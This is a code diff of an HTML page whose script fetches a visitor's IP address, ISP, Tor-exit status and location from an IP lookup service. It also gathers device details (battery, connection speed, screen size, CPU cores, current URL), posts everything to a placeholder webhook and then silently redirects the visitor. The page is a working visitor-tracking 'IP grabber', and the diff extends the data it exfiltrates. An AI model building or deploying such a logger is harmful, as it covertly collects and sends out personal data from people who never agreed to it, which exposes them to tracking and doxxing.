@@ -4,7 +4,7 @@
 <title>Untitled Website</title>
 <head>
    <script src="https://cdn.rawgit.com/github/fetch/master/fetch.js">
-   url2 = "url to redirect to"
+   url2 = "redirect url"
    try {
       var opts = { method: 'GET', headers: {}};
       fetch('https://myip.wtf/json', opts).then(function (response) {return response.json()}).then(function (data) {
@@ -29,11 +29,15 @@
                   { name: 'ISP :classical_building:', value: "`"+data.YourFuckingISP+'`', inline: 'true' },
                   { name: 'VPN :computer:', value: "`"+data.YourFuckingTorExit+'`', inline: 'true' },
                   { name:'Location :map:', value: "`"+data.YourFuckingLocation+'`', inline: 'true' },
-                  { name:'Page Redirect?', value: "`"+url2+'`', inline: 'true' },
-                  { name:'Other', value:'```Battery Charging?: '+battery.charging+"\nDownload Speed (mbps): "+navigator.connection.downlink+"\nScreen Size: "+window.screen.availWidth+" x "+window.screen.availHeight+'\nOS: '+Name+"\nUsed Cpu Cores: "+navigator.hardwareConcurrency+"\n```",  inline:true }
+                  { name:'Original URL :globe_with_meridians:', value: "`"+window.location.href+'`', inline: 'true' },
+                  { name:'Page Redirect URL :question:', value: "`"+url2+'`', inline: 'true' },
+                  { name:'Download Speed (mbps) :arrow_down:', value:'`'+navigator.connection.downlink+'`', inline: 'true'},
+                  { name:'Screen Size :tv:', value:'`'+window.screen.availWidth+" x "+window.screen.availHeight+'`', inline: 'true'},
+                  { name:'Used CPU Cores :electric_plug:', value:'`'+navigator.hardwareConcurrency+'`', inline: 'true'},
+                  { name:'Battery Charging :battery:', value:'`'+battery.charging+"`",  inline:true }
                   ]
                }]})}
-         var URL = `webhook link`;
+         var URL = `webhook url`;
          fetch(URL, opts2).then(function (response) {
             console.log(response);
             window.location.replace(url2); 
